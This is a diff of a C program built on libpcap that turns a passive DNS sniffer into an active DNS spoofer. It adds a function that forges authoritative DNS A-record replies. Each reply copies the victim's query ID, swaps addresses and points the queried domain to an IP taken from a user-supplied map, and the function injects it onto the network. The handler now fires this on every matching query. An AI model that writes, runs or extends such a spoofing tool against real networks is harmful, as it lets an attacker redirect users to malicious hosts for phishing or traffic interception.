@@ -7,11 +7,14 @@
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <pcap.h>
+#include <pcap/pcap.h>
+#include <stddef.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <strings.h>
+#include <sys/socket.h>
 #include <sys/types.h>
 #include <time.h>
 #include <unistd.h>
@@ -32,7 +35,7 @@ typedef struct {
   char ip[INET_ADDRSTRLEN];
 } DomainMapEntry;
 
-int domain_count = 0;
+int            domain_count = 0;
 DomainMapEntry domain_map[MAX_DOMAINS];
 
 void print_usage(const char *progname) {
@@ -63,9 +66,9 @@ int load_domain_map(const char *filename) {
       continue;
     }
 
-    *comma = '\0';
+    *comma       = '\0';
     char *domain = line;
-    char *ip = comma + 1;
+    char *ip     = comma + 1;
 
     if (domain_count >= MAX_DOMAINS) {
       fprintf(stderr, "Error: Too many domain mappings (limit %d)\n", MAX_DOMAINS);
@@ -84,8 +87,8 @@ int load_domain_map(const char *filename) {
 }
 
 const char *choose_interface(const char *requested_if) {
-  char errbuf[PCAP_ERRBUF_SIZE];
-  pcap_if_t *alldevs, *dev;
+  char        errbuf[PCAP_ERRBUF_SIZE];
+  pcap_if_t  *alldevs, *dev;
   const char *selected_if = NULL;
 
   // Find all network devices
@@ -136,18 +139,187 @@ const char *choose_interface(const char *requested_if) {
   return selected_if_copy;
 }
 
+// Function to calcualte IP checksum
+// Sum 16-bit wrods and folds any carreis baack into the sum.
+uint16_t calculate_ip_checksum(const void *vdata, size_t length) {
+  const uint16_t *data = (const uint16_t *)vdata;
+  uint32_t        sum  = 0;
+
+  // Sum all 16-bit words
+  while (length > 1) {
+    sum += *data++;
+    length -= 2;
+  }
+
+  // Add left-over byte, if any
+  if (length == 1) sum += *((uint8_t *)data);
+
+  // Fold 32-bit sum to 16-bits
+  while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
+
+  // One's complement of the sum
+  return (uint16_t)(~sum);
+}
+
+// Function to send a spoofed DNS A record response
+void send_dns_spoof_response(pcap_t *handle, const struct ether_header *ori_eth_hdr,
+                             const struct ip *ori_ip_hdr, const struct udphdr *ori_udp_hdr,
+                             const uint8_t *ori_dns_payload, int ori_qname_offset_in_dns_payload,
+                             int ori_qname_data_len_in_packet, const char *spoofed_ip_str) {
+  // Calculate fixed header sizes
+  const int ETH_HDR_SIZE = sizeof(struct ether_header);
+  const int IP_HDR_SIZE  = sizeof(struct ip);
+  const int UDP_HDR_SIZE = sizeof(struct udphdr);
+  const int DNS_HDR_SIZE = sizeof(dns_header_t);
+
+  // Calculate the total size of the original DNS question section
+  // QNAME bytes consumed + QTYPE + QCLASS
+  int ori_question_section_size = ori_qname_data_len_in_packet + sizeof(uint16_t) * 2;
+
+  // Calculate the size of the DNS Answer section for an A record:
+  // Name (2 bytes for compression pointer) + TYPE (2) + CLASS (2) + TTL (4) + RDLENGTH (2) + RDATA
+  // (4 for IPv4)
+  const int DNS_ANSER_A_REC_SIZE = sizeof(uint16_t) + sizeof(dns_rr_fixed_part_t) + 4;
+
+  // Estimate total response packet size
+  // Max DNS packet size (512) + headers
+  // Using `ori_dns_length` for the question, but adding a fixed answer section
+  // Let's use a generous buffer for safety :D
+  const int MAX_RESPONSE_PACKET_SIZE = ETH_HDR_SIZE + IP_HDR_SIZE + UDP_HDR_SIZE + DNS_HDR_SIZE +
+                                       ori_question_section_size + DNS_ANSER_A_REC_SIZE;
+
+  uint8_t *response_packet = (uint8_t *)malloc(MAX_RESPONSE_PACKET_SIZE);
+  if (!response_packet) {
+    perror("Error: Failed to allocate memory for response packet");
+    return;
+  }
+  memset(response_packet, 0, MAX_RESPONSE_PACKET_SIZE); // Zero out the buffer
+
+  // Pointers to the headers within our response_packet buffer
+  struct ether_header *eth_resp_hdr = (struct ether_header *)response_packet;
+  struct ip           *ip_resp_hdr  = (struct ip *)(response_packet + ETH_HDR_SIZE);
+  struct udphdr *udp_resp_hdr = (struct udphdr *)(response_packet + ETH_HDR_SIZE + IP_HDR_SIZE);
+  dns_header_t  *dns_resp_hdr =
+      (dns_header_t *)(response_packet + ETH_HDR_SIZE + IP_HDR_SIZE + UDP_HDR_SIZE);
+  uint8_t *dns_resp_paylaod = (uint8_t *)dns_resp_hdr; // Start of DNS payload
+
+  // --- 1. Construct Ethernet Header ---
+  // Swap source and destination MAC addresses
+  memcpy(eth_resp_hdr->ether_dhost, ori_eth_hdr->ether_shost, ETHER_ADDR_LEN);
+  memcpy(eth_resp_hdr->ether_shost, ori_eth_hdr->ether_dhost, ETHER_ADDR_LEN);
+  eth_resp_hdr->ether_type = htons(ETHERTYPE_IP);
+
+  // --- 2. Construct IP Header ---
+  ip_resp_hdr->ip_v   = 4;
+  ip_resp_hdr->ip_hl  = IP_HDR_SIZE / 4;
+  ip_resp_hdr->ip_tos = 0;
+  ip_resp_hdr->ip_id  = ori_ip_hdr->ip_id;
+  // ip_resp_hdr->ip_off = htons(IP_DF); // Don't Fragment
+  ip_resp_hdr->ip_ttl = 64;
+  ip_resp_hdr->ip_p   = IPPROTO_UDP;
+  ip_resp_hdr->ip_sum = 0; // Will be updated later
+  // Swap source and destination IP addresses
+  ip_resp_hdr->ip_src.s_addr = ori_ip_hdr->ip_dst.s_addr;
+  ip_resp_hdr->ip_dst.s_addr = ori_ip_hdr->ip_src.s_addr;
+
+  // --- 3. Construct UDP Header ---
+  udp_resp_hdr->uh_sport = htons(DNS_PORT);
+  udp_resp_hdr->uh_dport = ori_udp_hdr->uh_sport;
+  udp_resp_hdr->uh_sum   = 0; // TODO: Implement UDP Checksum
+
+  // --- 4. Construct DNS Header ---
+  dns_resp_hdr->id =
+      ((const dns_header_t *)ori_dns_payload)->id; // Transaction ID should match Query ID.
+  // Set DNS flags for successful authoritative response
+  // QR=1 (Response), Opcode=0 (Standard Query), AA=1 (Authoritative Answer),
+  // RD=1 (Recursive Desired, copy from query), RA=1 (Recursion Available), RCODE=0 (No Error)
+  uint16_t resp_flags = DNS_FLAG_QR_MASK | DNS_FLAG_AA_MASK | DNS_RCODE_NOERROR;
+  // Copy RD bit from original query
+  if (ntohs(((const dns_header_t *)ori_dns_payload)->flags) & DNS_FLAG_RD_MASK)
+    resp_flags |= DNS_FLAG_RD_MASK;
+  // Set RA (TODO: Check if we can set this if RD is not set)
+  resp_flags |= DNS_FLAG_RA_MASK;
+
+  dns_resp_hdr->flags   = htons(resp_flags);
+  dns_resp_hdr->qdcount = htons(1);
+  dns_resp_hdr->ancount = htons(1);
+  dns_resp_hdr->nscount = htons(0);
+  dns_resp_hdr->arcount = htons(0);
+
+  // --- 5. Copy DNS Quesiton Section ---
+  // The question section is located immediately after the DNS header in the original query
+  // ori_qname_offset_in_dns_payload is the offset of the QNAME from the start of the DNS payload
+  // Total length of the question section: QNAME (variable) + QTYPE (2) + QCLASS (2)
+  memcpy(dns_resp_paylaod + DNS_HDR_SIZE, ori_dns_payload + ori_qname_offset_in_dns_payload,
+         ori_question_section_size);
+
+  printf("DEBUG: QNAME: %s\n", ori_dns_payload + ori_qname_offset_in_dns_payload);
+
+  // --- 6. Add DNS Answer Section ---
+  // the answer section starts after the question section
+  uint8_t *current_offset_in_dns_payload =
+      dns_resp_paylaod + DNS_HDR_SIZE + ori_question_section_size;
+
+  // Name: Use a compression pointer to the QNAME in the question section
+  // The QNAME starts at offset DNS_HDR_SIZE (12 bytes) from the beginning of the DNS payload
+  uint16_t name_ptr = htons(DNS_LABEL_COMPRESSION_MASK | DNS_HDR_SIZE); // 0xC00C
+  memcpy(current_offset_in_dns_payload, &name_ptr, sizeof(name_ptr));
+  current_offset_in_dns_payload += sizeof(name_ptr);
+
+  // Fixed part of RR
+  dns_rr_fixed_part_t answer_rr;
+  answer_rr.rtype    = htons(DNS_TYPE_A);
+  answer_rr.rclass   = htons(DNS_CLASS_IN);
+  answer_rr.ttl      = htonl(60); // TODO: Implement as user input
+  answer_rr.rdlength = htons(4);
+
+  memcpy(current_offset_in_dns_payload, &answer_rr, sizeof(dns_rr_fixed_part_t));
+  current_offset_in_dns_payload += sizeof(dns_rr_fixed_part_t);
+
+  // RDATA: The spoofed IPv4 addresse
+  struct in_addr spoofed_ip_addr;
+  if (inet_pton(AF_INET, spoofed_ip_str, &spoofed_ip_addr) != 1) {
+    fprintf(stderr, "Error: Invalid spoofed IP address: %s\n", spoofed_ip_str);
+    free(response_packet);
+    return;
+  }
+  memcpy(current_offset_in_dns_payload, &spoofed_ip_addr.s_addr, sizeof(spoofed_ip_addr.s_addr));
+  current_offset_in_dns_payload += sizeof(spoofed_ip_addr.s_addr);
+
+  // --- 7. Finalize Lenghts and Checksum ---
+  int dns_resp_length   = (int)(current_offset_in_dns_payload - dns_resp_paylaod);
+  ip_resp_hdr->ip_len   = htons(IP_HDR_SIZE + UDP_HDR_SIZE + dns_resp_length);
+  udp_resp_hdr->uh_ulen = htons(UDP_HDR_SIZE + dns_resp_length);
+
+  // Calculate IP header checksum
+  ip_resp_hdr->ip_sum = calculate_ip_checksum(ip_resp_hdr, IP_HDR_SIZE);
+
+  // --- 8. Inject the crafted packet ---
+  int total_packet_len = ETH_HDR_SIZE + IP_HDR_SIZE + UDP_HDR_SIZE + dns_resp_length;
+
+  if (pcap_inject(handle, response_packet, total_packet_len) == -1) {
+    fprintf(stderr, "Error: Injecting packet: %s\n", pcap_geterr(handle));
+  } else {
+    // TODO: Think what to do here.
+    // Printing something might be costly.
+    printf("Injected!");
+  }
+}
+
 // Convert DNS name format to dotted domain (e.g: 3www6google3com0 ->
 // www.google.com) Returns: bytes consumed in payload if successful, or -1 or
 // error. Fills 'ouput' with the human-readable domain name
 //
-// !!! IMPORTANT: This function does NOT handle DNS compression pointers (0xC0 prefix).
-// !!! For a robust DNS parser, compression handling (often recursive) is required.
+// !!! IMPORTANT: This function does NOT handle DNS compression pointers (0xC0
+// prefix).
+// !!! For a robust DNS parser, compression handling (often recursive) is
+// required.
 // !!! This is a known limitation for now.
 int parse_dns_query_name(const uint8_t *payload, int payload_len, int offset, char *output,
                          int max_len) {
-  int current_pos = offset;        // Current reading position in DNS payload
-  int output_idx = 0;              // Current writing position in the output buffer
-  int bytes_consumed_in_field = 0; // Bytes from 'offset' this function consumed for the QNAME
+  int current_pos             = offset; // Current reading position in DNS payload
+  int output_idx              = 0;      // Current writing position in the output buffer
+  int bytes_consumed_in_field = 0;      // Bytes from 'offset' this function consumed for the QNAME
 
   while (current_pos < payload_len) {
     uint8_t len_byte = payload[current_pos];
@@ -207,9 +379,9 @@ void print_dns_packet_info(const struct ip *ip_hdr, const struct udphdr *udp_hdr
                            const uint8_t *dns_payload, int dns_length,
                            const struct pcap_pkthdr *p_pkt_hdr, const char *queried_domain,
                            uint16_t qtype, uint16_t qclass, const char *spoofed_ip) {
-  char time_str[64];
-  time_t pkt_time = p_pkt_hdr->ts.tv_sec;
-  struct tm *ltime = localtime(&pkt_time);
+  char       time_str[64];
+  time_t     pkt_time = p_pkt_hdr->ts.tv_sec;
+  struct tm *ltime    = localtime(&pkt_time);
   strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", ltime);
 
   // Extract IPs and Ports
@@ -281,19 +453,19 @@ void print_dns_packet_info(const struct ip *ip_hdr, const struct udphdr *udp_hdr
 
 void dns_packet_handler(u_char *user, const struct pcap_pkthdr *pkt_header,
                         const u_char *raw_packet) {
-  (void)user;
+  pcap_t *handle = (pcap_t *)user;
 
   const struct ether_header *eth_hdr;
-  const struct ip *ip_hdr;
-  const struct udphdr *udp_hdr;
-  const uint8_t *dns_payload;
+  const struct ip           *ip_hdr;
+  const struct udphdr       *udp_hdr;
+  const uint8_t             *dns_payload;
 
   // Parse Ethernet header
   eth_hdr = (const struct ether_header *)raw_packet;
   if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP) return;
 
   // Parse IP header
-  ip_hdr = (const struct ip *)(raw_packet + sizeof(struct ether_header));
+  ip_hdr                 = (const struct ip *)(raw_packet + sizeof(struct ether_header));
   uint32_t ip_header_len = ip_hdr->ip_hl * 4;
   // Basic IP length validation
   if (ip_header_len < 20 || ip_header_len > ip_hdr->ip_len * 4) return;
@@ -308,7 +480,7 @@ void dns_packet_handler(u_char *user, const struct pcap_pkthdr *pkt_header,
   if (ntohs(udp_hdr->uh_dport) != DNS_PORT && ntohs(udp_hdr->uh_sport) != DNS_PORT) return;
 
   // Get DNS payload pointer and length
-  dns_payload = (const uint8_t *)udp_hdr + sizeof(struct udphdr);
+  dns_payload         = (const uint8_t *)udp_hdr + sizeof(struct udphdr);
   uint32_t dns_length = ntohs(udp_hdr->uh_ulen) - sizeof(struct udphdr);
 
   // Only process DNS packet
@@ -332,7 +504,7 @@ void dns_packet_handler(u_char *user, const struct pcap_pkthdr *pkt_header,
             qdcount);
   }
 
-  char queried_domain[DNS_MAX_NAME_LENGTH + 1];
+  char     queried_domain[DNS_MAX_NAME_LENGTH + 1];
   uint32_t current_dns_offset =
       sizeof(dns_header_t); // Start of Question section is after the DNS header
 
@@ -344,6 +516,10 @@ void dns_packet_handler(u_char *user, const struct pcap_pkthdr *pkt_header,
     return;
   }
 
+  // Store the initial offset of the QNAME for the response
+  int initial_qname_offset_in_dns_payload = current_dns_offset;
+
+  printf("DEBUG: QNAME: %s\n", dns_payload + initial_qname_offset_in_dns_payload);
   // Advance past the QNAME to get to QTYPE and QCLASS
   current_dns_offset += name_len_in_packet;
 
@@ -355,20 +531,25 @@ void dns_packet_handler(u_char *user, const struct pcap_pkthdr *pkt_header,
 
   // Extract QTYPE and QCLASS
   const uint8_t *qtype_ptr = dns_payload + current_dns_offset;
-  uint16_t qtype = ntohs(*(const uint16_t *)qtype_ptr);
-  uint16_t qclass = ntohs(*(uint16_t *)(dns_payload + current_dns_offset + sizeof(uint16_t)));
+  uint16_t       qtype     = ntohs(*(const uint16_t *)qtype_ptr);
+  uint16_t       qclass = ntohs(*(uint16_t *)(dns_payload + current_dns_offset + sizeof(uint16_t)));
 
-  printf(COLOR_LABEL "Queried domain:         " COLOR_RESET "%s\n", queried_domain);
+  // printf(COLOR_LABEL "Queried domain:         " COLOR_RESET "%s\n", queried_domain);
 
-  printf("QTYPE: %hu, QCLASS: %hu\n", qtype, qclass);
+  // printf("QTYPE: %hu, QCLASS: %hu\n", qtype, qclass);
 
+  int delete_me = 12;
   // Check for A record and match with doamin map
   if (qtype == DNS_TYPE_A && qclass == DNS_CLASS_IN) {
     for (int i = 0; i < domain_count; i++) {
       if (strcasecmp(queried_domain, domain_map[i].domain) == 0) {
-        printf("TODO: Inject Response: %s --> %s\n", domain_map[i].domain, domain_map[i].ip);
-        print_dns_packet_info(ip_hdr, udp_hdr, dns_payload, dns_length, pkt_header, queried_domain,
-                              qtype, qclass, domain_map[i].ip);
+        // printf("TODO: Inject Response: %s --> %s\n", domain_map[i].domain, domain_map[i].ip);
+        send_dns_spoof_response(handle, eth_hdr, ip_hdr, udp_hdr, dns_payload,
+                                initial_qname_offset_in_dns_payload, name_len_in_packet,
+                                domain_map[i].ip);
+        if (delete_me % 2 == 1)
+          print_dns_packet_info(ip_hdr, udp_hdr, dns_payload, dns_length, pkt_header,
+                                queried_domain, qtype, qclass, domain_map[i].ip);
         break;
       }
     }
@@ -376,9 +557,9 @@ void dns_packet_handler(u_char *user, const struct pcap_pkthdr *pkt_header,
 }
 
 int main(int argc, char **argv) {
-  char *iface = NULL;
+  char *iface     = NULL;
   char *file_path = NULL;
-  int opt;
+  int   opt;
 
   opterr = 0;
 
@@ -444,8 +625,8 @@ int main(int argc, char **argv) {
 
   // Set up BPF filter for DNS (UDP port 53)
   struct bpf_program dns_filter;
-  const char filter_exp[] = "port 53";
-  bpf_u_int32 net_mask = PCAP_NETMASK_UNKNOWN;
+  const char         filter_exp[] = "port 53";
+  bpf_u_int32        net_mask     = PCAP_NETMASK_UNKNOWN;
 
   // Compile the BPF filter
   if (pcap_compile(handle, &dns_filter, filter_exp, 0, net_mask) == -1) {
@@ -466,7 +647,7 @@ int main(int argc, char **argv) {
          iface ? iface : "(default interface)");
 
   // Start packet capture loop, call packet_handler for each packet
-  pcap_loop(handle, -1, dns_packet_handler, NULL);
+  pcap_loop(handle, -1, dns_packet_handler, (u_char *)handle);
 
   pcap_freecode(&dns_filter);
   pcap_close(handle);
